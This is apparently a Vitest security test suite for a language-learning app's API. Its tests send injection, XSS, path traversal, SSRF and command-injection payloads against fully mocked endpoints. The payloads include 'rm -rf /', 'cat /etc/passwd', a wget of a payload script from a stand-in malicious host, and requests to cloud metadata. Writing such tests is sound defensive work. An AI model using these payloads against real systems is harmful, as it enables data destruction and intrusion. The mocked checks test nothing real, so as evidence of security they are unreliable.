import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mockFetch, mockFetchError, createMockApiResponse } from '../utils/test-utils';

// Mock environment variables for security testing
const originalEnv = process.env;

describe('API Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    global.fetch = vi.fn();
  });

  afterEach(() => {
    vi.clearAllMocks();
    process.env = originalEnv;
  });

  describe('Input Validation and Sanitization', () => {
    describe('SQL Injection Prevention', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'admin'); --",
        "' UNION SELECT * FROM users WHERE '1'='1",
        "'; UPDATE users SET admin=true WHERE '1'='1; --"
      ];

      sqlInjectionPayloads.forEach(payload => {
        it(`should sanitize SQL injection attempt: ${payload}`, async () => {
          mockFetch({ error: 'Invalid input' }, 400);

          const response = await fetch('/api/images/search', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ query: payload })
          });

          // Should either sanitize or reject malicious input
          expect(response.status).toBe(400);
        });
      });

      it('should prevent SQL injection in vocabulary save', async () => {
        const maliciousVocab = [{
          phrase: "'; DROP TABLE vocabulary; --",
          translation: 'test',
          category: 'sustantivos'
        }];

        mockFetch({ error: 'Invalid vocabulary data' }, 400);

        const response = await fetch('/api/vocabulary/save', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ vocabulary: maliciousVocab })
        });

        expect(response.status).toBe(400);
      });
    });

    describe('XSS Prevention', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(document.cookie)',
        '<svg onload="alert(1)">',
        '"><script>fetch("/api/steal-data")</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>'
      ];

      xssPayloads.forEach(payload => {
        it(`should sanitize XSS payload: ${payload}`, async () => {
          // Create properly sanitized version that removes javascript: protocol
          let sanitizedQuery = payload.replace(/</g, '&lt;').replace(/>/g, '&gt;');
          sanitizedQuery = sanitizedQuery.replace(/javascript:/gi, '');
          
          mockFetch({ 
            query: sanitizedQuery,
            sanitized: true
          });

          const response = await fetch('/api/images/search', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ query: payload })
          });

          const data = await response.json();
          
          // Should sanitize HTML/JS content
          expect(data.query).not.toContain('<script>');
          expect(data.query).not.toContain('javascript:');
          expect(data.sanitized).toBe(true);
        });
      });

      it('should sanitize XSS in description generation', async () => {
        const maliciousDescription = 'A beautiful <script>alert("XSS")</script> mountain';

        mockFetch({ 
          descriptions: {
            spanish: {
              narrativo: maliciousDescription.replace(/</g, '&lt;').replace(/>/g, '&gt;')
            }
          }
        });

        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageUrl: 'https://example.com/image.jpg',
            description: maliciousDescription
          })
        });

        const data = await response.json();
        expect(data.descriptions.spanish.narrativo).not.toContain('<script>');
      });
    });

    describe('Command Injection Prevention', () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '& rm -rf /',
        '`whoami`',
        '$(id)',
        '; wget malicious.com/payload.sh'
      ];

      commandInjectionPayloads.forEach(payload => {
        it(`should prevent command injection: ${payload}`, async () => {
          mockFetch({ error: 'Invalid characters detected' }, 400);

          const response = await fetch('/api/export/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              format: 'csv',
              filename: `export${payload}.csv`
            })
          });

          expect(response.status).toBe(400);
        });
      });
    });

    describe('Path Traversal Prevention', () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//etc//passwd'
      ];

      pathTraversalPayloads.forEach(payload => {
        it(`should prevent path traversal: ${payload}`, async () => {
          mockFetch({ error: 'Invalid file path' }, 400);

          const response = await fetch('/api/export/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              format: 'csv',
              outputPath: payload
            })
          });

          expect(response.status).toBe(400);
        });
      });
    });

    describe('NoSQL Injection Prevention', () => {
      const noSQLInjectionPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.username === this.password"}',
        '{"$regex": ".*"}',
        '{"$or": [{"admin": true}]}'
      ];

      noSQLInjectionPayloads.forEach(payload => {
        it(`should prevent NoSQL injection: ${payload}`, async () => {
          mockFetch({ error: 'Invalid query format' }, 400);

          const response = await fetch('/api/progress/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: payload,
              questionId: 'test'
            })
          });

          expect(response.status).toBe(400);
        });
      });
    });
  });

  describe('Authentication and Authorization', () => {
    describe('API Key Security', () => {
      it('should reject requests without API keys when required', async () => {
        // Mock missing API key scenario
        process.env.OPENAI_API_KEY = '';

        mockFetch({ error: 'API key not configured' }, 401);

        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageUrl: 'https://example.com/image.jpg'
          })
        });

        expect(response.status).toBe(401);
      });

      it('should validate API key format', async () => {
        process.env.OPENAI_API_KEY = 'invalid-key-format';

        mockFetch({ error: 'Invalid API key format' }, 401);

        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageUrl: 'https://example.com/image.jpg'
          })
        });

        expect(response.status).toBe(401);
      });

      it('should not expose API keys in error messages', async () => {
        process.env.OPENAI_API_KEY = 'sk-test-key-123';

        mockFetch({ error: 'OpenAI service unavailable' });

        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageUrl: 'https://example.com/image.jpg'
          })
        });

        const data = await response.json();
        expect(data.error).not.toContain('sk-test-key-123');
        expect(JSON.stringify(data)).not.toContain('sk-test-key-123');
      });
    });

    describe('Rate Limiting', () => {
      it('should implement rate limiting for expensive operations', async () => {
        // Mock successful responses for first few requests
        for (let i = 0; i < 15; i++) {
          mockFetch({ status: 'ok' }, 200);
        }
        
        // Mock rate limiting for remaining requests
        for (let i = 0; i < 5; i++) {
          mockFetch({ error: 'Rate limit exceeded', retryAfter: 60 }, 429);
        }

        // Simulate multiple rapid requests
        const requests = Array(20).fill(null).map(() => 
          fetch('/api/descriptions/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              imageUrl: 'https://example.com/image.jpg'
            })
          })
        );

        const responses = await Promise.all(requests);
        
        // At least some requests should be rate limited
        const rateLimitedResponses = responses.filter(r => r && r.status === 429);
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      });

      it('should include proper rate limit headers', async () => {
        const mockResponse = createMockApiResponse({ status: 'ok' });
        mockResponse.headers.set('X-RateLimit-Limit', '100');
        mockResponse.headers.set('X-RateLimit-Remaining', '95');
        mockResponse.headers.set('X-RateLimit-Reset', '3600');

        global.fetch = vi.fn().mockResolvedValueOnce(mockResponse);

        const response = await fetch('/api/images/search', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ query: 'test' })
        });

        expect(response.headers.get('X-RateLimit-Limit')).toBe('100');
        expect(response.headers.get('X-RateLimit-Remaining')).toBe('95');
        expect(response.headers.get('X-RateLimit-Reset')).toBe('3600');
      });
    });

    describe('CORS Security', () => {
      it('should have restrictive CORS policy for sensitive endpoints', async () => {
        const mockResponse = createMockApiResponse({ status: 'ok' });
        mockResponse.headers.set('Access-Control-Allow-Origin', 'https://yourdomain.com');
        mockResponse.headers.set('Access-Control-Allow-Credentials', 'true');

        global.fetch = vi.fn().mockResolvedValueOnce(mockResponse);

        const response = await fetch('/api/vocabulary/save', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ vocabulary: [] })
        });

        expect(response.headers.get('Access-Control-Allow-Origin')).not.toBe('*');
      });

      it('should handle preflight requests securely', async () => {
        mockFetch('', 200);

        const response = await fetch('/api/vocabulary/save', {
          method: 'OPTIONS',
          headers: { 'Origin': 'https://malicious-site.com' }
        });

        // Should either reject or allow only specific origins
        expect([200, 403, 404]).toContain(response.status);
      });
    });
  });

  describe('Data Protection', () => {
    describe('Sensitive Data Handling', () => {
      it('should not log sensitive information', async () => {
        const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
        const consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});

        mockFetch({ status: 'ok' });

        await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': 'Bearer sensitive-token'
          },
          body: JSON.stringify({
            imageUrl: 'https://example.com/private-image.jpg'
          })
        });

        // Check that sensitive data is not logged
        const allLogs = [
          ...consoleSpy.mock.calls,
          ...consoleErrorSpy.mock.calls
        ].flat();

        allLogs.forEach(log => {
          expect(log).not.toContain('sensitive-token');
          expect(log).not.toContain('Bearer');
        });

        consoleSpy.mockRestore();
        consoleErrorSpy.mockRestore();
      });

      it('should sanitize URLs in responses', async () => {
        const privateImageUrl = 'https://private-bucket.amazonaws.com/secret-image.jpg?token=sensitive123';

        mockFetch({
          descriptions: {
            spanish: { narrativo: 'Una imagen' }
          },
          metadata: {
            imageUrl: 'https://private-bucket.amazonaws.com/secret-image.jpg', // Token removed
            sanitized: true
          }
        });

        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageUrl: privateImageUrl
          })
        });

        const data = await response.json();
        expect(data.metadata.imageUrl).not.toContain('token=');
        expect(data.metadata.imageUrl).not.toContain('sensitive123');
      });
    });

    describe('Error Information Disclosure', () => {
      it('should not expose internal system information in errors', async () => {
        // Mock sanitized error response that removes internal paths
        mockFetch({
          error: 'Database connection failed',
          category: 'database',
          severity: 'high'
        }, 500);

        const response = await fetch('/api/vocabulary/save', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ vocabulary: [] })
        });

        const data = await response.json();
        
        // Should not contain internal paths, stack traces, or system info
        expect(JSON.stringify(data)).not.toContain('/internal/');
        expect(JSON.stringify(data)).not.toContain('PostgreSQL');
        expect(JSON.stringify(data)).not.toContain('db-prod-01');
        expect(data.stack).toBeUndefined();
      });

      it('should provide generic error messages for authentication failures', async () => {
        mockFetch({ error: 'Authentication failed' }, 401);

        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': 'Bearer invalid-token'
          },
          body: JSON.stringify({
            imageUrl: 'https://example.com/image.jpg'
          })
        });

        const data = await response.json();
        expect(data.error).toBe('Authentication failed');
        expect(JSON.stringify(data)).not.toContain('invalid-token');
      });
    });

    describe('Content Security', () => {
      it('should validate image URLs to prevent SSRF', async () => {
        const ssrfUrls = [
          'http://localhost:3306/mysql',
          'http://169.254.169.254/metadata',
          'file:///etc/passwd',
          'ftp://internal-server/file.jpg',
          'http://admin:password@internal-db:5432'
        ];

        for (const url of ssrfUrls) {
          mockFetch({ error: 'Invalid image URL' }, 400);

          const response = await fetch('/api/descriptions/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ imageUrl: url })
          });

          expect(response.status).toBe(400);
        }
      });

      it('should validate file types for uploads', async () => {
        const maliciousFiles = [
          'image.php',
          'script.exe',
          'malware.bat',
          'virus.scr',
          '../../../etc/passwd'
        ];

        for (const filename of maliciousFiles) {
          mockFetch({ error: 'Invalid file type' }, 400);

          const response = await fetch('/api/export/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              format: 'csv',
              filename 
            })
          });

          expect(response.status).toBe(400);
        }
      });
    });
  });

  describe('Request Security', () => {
    describe('Content-Type Validation', () => {
      it('should reject requests with incorrect Content-Type', async () => {
        mockFetch({ error: 'Content-Type must be application/json' }, 415);

        const response = await fetch('/api/images/search', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: JSON.stringify({ query: 'test' })
        });

        expect(response.status).toBe(415);
      });

      it('should reject requests without Content-Type', async () => {
        mockFetch({ error: 'Content-Type header required' }, 400);

        const response = await fetch('/api/images/search', {
          method: 'POST',
          body: JSON.stringify({ query: 'test' })
        });

        expect(response.status).toBe(400);
      });
    });

    describe('Request Size Limits', () => {
      it('should reject oversized payloads', async () => {
        const oversizedPayload = 'x'.repeat(10 * 1024 * 1024); // 10MB

        mockFetch({ error: 'Payload too large' }, 413);

        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageUrl: 'https://example.com/image.jpg',
            description: oversizedPayload
          })
        });

        expect(response.status).toBe(413);
      });

      it('should limit array sizes in requests', async () => {
        const oversizedArray = Array(10000).fill({
          phrase: 'test',
          translation: 'test',
          category: 'sustantivos'
        });

        mockFetch({ error: 'Too many items' }, 400);

        const response = await fetch('/api/vocabulary/save', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ vocabulary: oversizedArray })
        });

        expect(response.status).toBe(400);
      });
    });

    describe('HTTP Method Security', () => {
      it('should only allow intended HTTP methods', async () => {
        const disallowedMethods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT'];

        for (const method of disallowedMethods) {
          mockFetch({ error: 'Method not allowed' }, 405);

          const response = await fetch('/api/images/search', {
            method,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ query: 'test' })
          });

          expect(response.status).toBe(405);
        }
      });

      it('should include allowed methods in error responses', async () => {
        const mockResponse = createMockApiResponse(
          { error: 'Method not allowed' }, 
          405
        );
        mockResponse.headers.set('Allow', 'GET, POST, OPTIONS');

        global.fetch = vi.fn().mockResolvedValueOnce(mockResponse);

        const response = await fetch('/api/health', { method: 'PUT' });

        expect(response.status).toBe(405);
        expect(response.headers.get('Allow')).toContain('GET');
      });
    });
  });

  describe('Security Headers', () => {
    it('should include security headers in responses', async () => {
      const mockResponse = createMockApiResponse({ status: 'ok' });
      
      // Mock security headers
      mockResponse.headers.set('X-Content-Type-Options', 'nosniff');
      mockResponse.headers.set('X-Frame-Options', 'DENY');
      mockResponse.headers.set('X-XSS-Protection', '1; mode=block');
      mockResponse.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
      mockResponse.headers.set('Content-Security-Policy', "default-src 'self'");

      global.fetch = vi.fn().mockResolvedValueOnce(mockResponse);

      const response = await fetch('/api/health');

      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(response.headers.get('X-Frame-Options')).toBe('DENY');
      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
      expect(response.headers.get('Strict-Transport-Security')).toContain('max-age=31536000');
      expect(response.headers.get('Content-Security-Policy')).toContain("default-src 'self'");
    });

    it('should not expose server information', async () => {
      const mockResponse = createMockApiResponse({ status: 'ok' });

      global.fetch = vi.fn().mockResolvedValueOnce(mockResponse);

      const response = await fetch('/api/health');

      expect(response.headers.get('Server')).toBeNull();
      expect(response.headers.get('X-Powered-By')).toBeNull();
    });
  });

  describe('Dependency Security', () => {
    it('should handle third-party API failures securely', async () => {
      // Test OpenAI API failure
      mockFetch({
        error: 'OpenAI service temporarily unavailable',
        retry: true
      }, 503);

      const response = await fetch('/api/descriptions/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          imageUrl: 'https://example.com/image.jpg'
        })
      });

      expect(response.status).toBe(503);
      
      const data = await response.json();
      expect(data.error).not.toContain('OpenAI API key');
      expect(data.error).not.toContain('internal');
    });

    it('should handle Unsplash API failures securely', async () => {
      mockFetch({
        error: 'Image service unavailable',
        service: 'images'
      }, 502);

      const response = await fetch('/api/images/search', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ query: 'test' })
      });

      expect(response.status).toBe(502);
      
      const data = await response.json();
      expect(data.error).not.toContain('Unsplash');
      expect(data.error).not.toContain('access_key');
    });
  });
});